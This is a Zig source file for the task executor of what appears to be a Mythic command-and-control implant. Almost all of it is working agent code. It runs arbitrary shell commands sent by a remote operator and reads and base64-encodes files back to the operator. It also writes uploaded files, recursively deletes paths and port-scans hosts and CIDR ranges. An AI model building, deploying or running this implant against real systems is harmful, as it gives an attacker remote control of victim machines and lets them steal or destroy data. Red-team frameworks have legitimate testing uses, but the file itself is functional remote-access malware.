const std = @import("std");
const builtin = @import("builtin");
const types = @import("types.zig");
const json = std.json;
const base64 = std.base64;
const Allocator = std.mem.Allocator;
const Io = std.Io;
const ArrayList = std.ArrayList;

const MythicTask = types.MythicTask;
const MythicResponse = types.MythicResponse;

pub const CommandExecutor = struct {
    allocator: Allocator,
    io: Io,

    pub fn init(allocator: Allocator, io: Io) CommandExecutor {
        return CommandExecutor{
            .allocator = allocator,
            .io = io,
        };
    }

    pub fn executeTask(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        if (std.mem.eql(u8, task.command, "shell")) {
            return try self.executeShell(task);
        } else if (std.mem.eql(u8, task.command, "pwd")) {
            return try self.executePwd(task);
        } else if (std.mem.eql(u8, task.command, "ls")) {
            return try self.executeLs(task);
        } else if (std.mem.eql(u8, task.command, "cat")) {
            return try self.executeCat(task);
        } else if (std.mem.eql(u8, task.command, "download")) {
            return try self.executeDownload(task);
        } else if (std.mem.eql(u8, task.command, "upload")) {
            return try self.executeUpload(task);
        } else if (std.mem.eql(u8, task.command, "deletefile")) {
            return try self.deleteFile(task);
        } else if (std.mem.eql(u8, task.command, "deletedirectory")) {
            return try self.deleteDirectory(task);
        } else if (std.mem.eql(u8, task.command, "portscan")) {
            return try self.executePortscan(task);
        } else {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{s}", .{task.command}),
                .completed = true,
                .status = "error",
            };
        }
    }

    fn executeShell(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const ShellParameters = struct {
            command: []const u8,
        };
        const parsed = try json.parseFromSlice(ShellParameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();
        const command = parsed.value.command;
        if (command.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No command provided",
                .completed = true,
                .status = "error",
            };
        }
        const shell_path = if (builtin.os.tag == .windows) "cmd.exe" else "/bin/sh";
        const shell_args = if (builtin.os.tag == .windows) "/c" else "-c";
        const result = std.process.run(self.allocator, self.io, .{
            .argv = &[_][]const u8{ shell_path, shell_args, command },
        }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                .completed = true,
                .status = "error",
            };
        };

        defer self.allocator.free(result.stdout);
        defer self.allocator.free(result.stderr);

        const output = if (result.stdout.len > 0) result.stdout else result.stderr;

        return MythicResponse{
            .task_id = task.id,
            .user_output = try self.allocator.dupe(u8, output),
            .completed = true,
            .status = "completed",
        };
    }

    fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const cwd = std.process.currentPathAlloc(self.io, self.allocator) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                .completed = true,
                .status = "error",
            };
        };

        return MythicResponse{
            .task_id = task.id,
            .user_output = cwd,
            .completed = true,
            .status = "completed",
        };
    }

    fn executeLs(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const Parameters = struct {
            path: []const u8 = ".",
        };

        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();

        const path = parsed.value.path;

        var dir = std.Io.Dir.cwd().openDir(self.io, path, .{ .iterate = true }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ path, err }),
                .completed = true,
                .status = "error",
            };
        };
        defer dir.close(self.io);

        var output = ArrayList(u8).empty;
        defer output.deinit(self.allocator);

        var iterator = dir.iterate();
        while (try iterator.next(self.io)) |entry| {
            try output.appendSlice(self.allocator, entry.name);
            try output.append(self.allocator, '\n');
        }

        return MythicResponse{
            .task_id = task.id,
            .user_output = try output.toOwnedSlice(self.allocator),
            .completed = true,
            .status = "completed",
        };
    }

    fn executeCat(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        if (task.parameters.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No filename provided",
                .completed = true,
                .status = "error",
            };
        }

        const content = std.Io.Dir.cwd().readFileAlloc(self.io, task.parameters, self.allocator, .limited(1024 * 1024)) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ task.parameters, err }),
                .completed = true,
                .status = "error",
            };
        };

        return MythicResponse{
            .task_id = task.id,
            .user_output = content,
            .completed = true,
            .status = "completed",
        };
    }

    fn executeDownload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const file_content = std.Io.Dir.cwd().readFileAlloc(self.io, task.parameters, self.allocator, .limited(10 * 1024 * 1024)) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        defer self.allocator.free(file_content);

        const encoder = base64.standard.Encoder;
        const encoded_size = encoder.calcSize(file_content.len);
        const encoded_content = try self.allocator.alloc(u8, encoded_size);
        _ = encoder.encode(encoded_content, file_content);

        return MythicResponse{
            .task_id = task.id,
            .download = types.DownloadInfo{
                .chunk_num = 1,
                .chunk_data = encoded_content,
                .total_chunks = 1,
                .full_path = task.parameters,
                .chunk_size = encoded_content.len,
                .is_screenshot = false,
            },
            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ task.parameters, file_content.len }),
            .completed = true,
            .status = "completed",
        };
    }

    fn executeUpload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const parsed = json.parseFromSlice(json.Value, self.allocator, task.parameters, .{}) catch {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "Invalid upload parameters",
                .completed = true,
                .status = "error",
            };
        };
        defer parsed.deinit();

        const remote_path = parsed.value.object.get("remote_path").?.string;
        const b64_content = parsed.value.object.get("content").?.string;
        const decoded_len = base64.standard.Decoder.calcSizeForSlice(b64_content) catch {
            std.debug.print("", .{});
            return error.InvalidBase64;
        };
        const decoded_content = try self.allocator.alloc(u8, decoded_len);
        defer self.allocator.free(decoded_content);
        base64.standard.Decoder.decode(decoded_content, b64_content) catch {
            std.debug.print("", .{});
            return error.InvalidBase64;
        };

        if (std.mem.eql(u8, remote_path, "/")) {
            const file = try std.Io.Dir.createFileAbsolute(self.io, remote_path, .{});
            defer file.close(self.io);
            if (std.mem.startsWith(u8, decoded_content, "b'") and std.mem.endsWith(u8, decoded_content, "'")) {
                // Remove the b'' prefix if present. Very hacky and hould be improved. Sould write an unescape function later.
                const content = decoded_content[2 .. decoded_content.len - 1];
                try file.writeStreamingAll(self.io, content);
            } else {
                try file.writeStreamingAll(self.io, decoded_content);
            }
        } else {
            std.Io.Dir.cwd().writeFile(self.io, .{ .sub_path = remote_path, .data = decoded_content }) catch |err| {
                return MythicResponse{
                    .task_id = task.id,
                    .user_output = try std.fmt.allocPrint(self.allocator, "Failed to write file: {}", .{err}),
                    .completed = true,
                    .status = "error",
                };
            };
        }
        return MythicResponse{
            .task_id = task.id,
            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ remote_path, b64_content.len }),
            .completed = true,
            .status = "completed",
        };
    }

    fn deleteFile(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const Parameters = struct {
            path: []const u8,
        };
        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();
        const path = parsed.value.path;
        if (path.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No path provided",
                .completed = true,
                .status = "error",
            };
        }
        std.Io.Dir.cwd().deleteTree(self.io, path) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to delete file: {}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        return MythicResponse{
            .task_id = task.id,
            .user_output = try std.fmt.allocPrint(self.allocator, "Deleted file: {s}", .{path}),
            .completed = true,
            .status = "completed",
        };
    }

    fn deleteDirectory(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const Parameters = struct {
            path: []const u8,
        };
        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();
        const path = parsed.value.path;
        if (path.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No path provided",
                .completed = true,
                .status = "error",
            };
        }
        std.Io.Dir.cwd().deleteTree(self.io, path) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to delete directory: {}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        return MythicResponse{
            .task_id = task.id,
            .user_output = try std.fmt.allocPrint(self.allocator, "Deleted directory: {s}", .{path}),
            .completed = true,
            .status = "completed",
        };
    }

    fn executePortscan(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const Parameters = struct {
            hosts: []const u8,
            ports: []const u8 = "22,80,443,445,3389,8080",
            timeout_ms: u32 = 500,
        };
        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();
        const params = parsed.value;

        var results = ArrayList(u8).empty;
        defer results.deinit(self.allocator);

        const ports = try parsePorts(self.allocator, params.ports);
        defer self.allocator.free(ports);

        try results.appendSlice(self.allocator, "Host                 Port   State\n");
        try results.appendSlice(self.allocator, "----                 ----   -----\n");

        var hosts_iterator = std.mem.splitScalar(u8, params.hosts, ',');
        while (hosts_iterator.next()) |entry| {
        const host = std.mem.trim(u8, entry, " ");
        if (std.mem.indexOf(u8, host, "/") != null) {
            try self.scanCidr(host, ports, params.timeout_ms, &results);
        } else {
            try self.scanHost(host, ports, params.timeout_ms, &results);
        }
    }

        return MythicResponse{
            .task_id = task.id,
            .user_output = try results.toOwnedSlice(self.allocator),
            .completed = true,
            .status = "completed",
        };
    }

    fn scanHost(self: *CommandExecutor, host: []const u8, ports: []const u16, timeout_ms: u32, results: *std.ArrayList(u8)) !void {
        for (ports) |port| {
            if (tcpProbe(self.io, host, port, timeout_ms)) {
                const line = try std.fmt.allocPrint(self.allocator, "{s:<21}{d:<7}open\n", .{ host, port });
                defer self.allocator.free(line);
                try results.appendSlice(self.allocator, line);
            }
        }
    }

    fn scanCidr(self: *CommandExecutor, cidr: []const u8, ports: []const u16, timeout_ms: u32,results: *std.ArrayList(u8)) !void {
        const slash = std.mem.indexOf(u8, cidr, "/") orelse return error.InvalidCidr;
        const base_str = cidr[0..slash];
        const prefix_len = try std.fmt.parseInt(u8, cidr[slash + 1 ..], 10);

        const base_addr = try std.Io.net.Ip4Address.parse(base_str, 0);
        const base_int = std.mem.readInt(u32, &base_addr.bytes, .big);

        const host_bits: u5 = @intCast(32 - prefix_len);
        const host_count: u32 = @as(u32, 1) << host_bits;

        var i: u32 = 1;
        while (i < host_count - 1) : (i += 1) {
            const ip_int = (base_int & (~@as(u32, 0) << host_bits)) | i;
            const ip_bytes = std.mem.toBytes(std.mem.nativeToBig(u32, ip_int));
            var host_buf: [16]u8 = undefined;
            const host = try std.fmt.bufPrint(&host_buf, "{}.{}.{}.{}", .{
                ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3],
            });
            try self.scanHost(host, ports, timeout_ms, results);
        }
    }

    fn tcpProbe(io: Io, host: []const u8, port: u16, timeout_ms: u32) bool {
        _ = timeout_ms; // blocking IO. TODO: implement async version later
        const ip4 = std.Io.net.Ip4Address.parse(host, port) catch return false;
        const addr = std.Io.net.IpAddress{ .ip4 = ip4 };
        const stream = addr.connect(io, .{ .mode = .stream } ) catch return false;
        stream.close(io);
        return true;
    }

    fn parsePorts(allocator: Allocator, ports_str: []const u8) ![]u16 {
        var list = std.ArrayList(u16).empty;
        var it = std.mem.splitScalar(u8, ports_str, ',');
        while (it.next()) |token| {
            const t = std.mem.trim(u8, token, " ");
            if (std.mem.indexOf(u8, t, "-")) |dash| {
                const lo = try std.fmt.parseInt(u16, t[0..dash], 10);
                const hi = try std.fmt.parseInt(u16, t[dash + 1 ..], 10);
                var p = lo;
                while (p <= hi) : (p += 1) try list.append(allocator, p);
            } else {
                try list.append(allocator, try std.fmt.parseInt(u16, t, 10));
            }
        }
        return list.toOwnedSlice(allocator);
    }
};
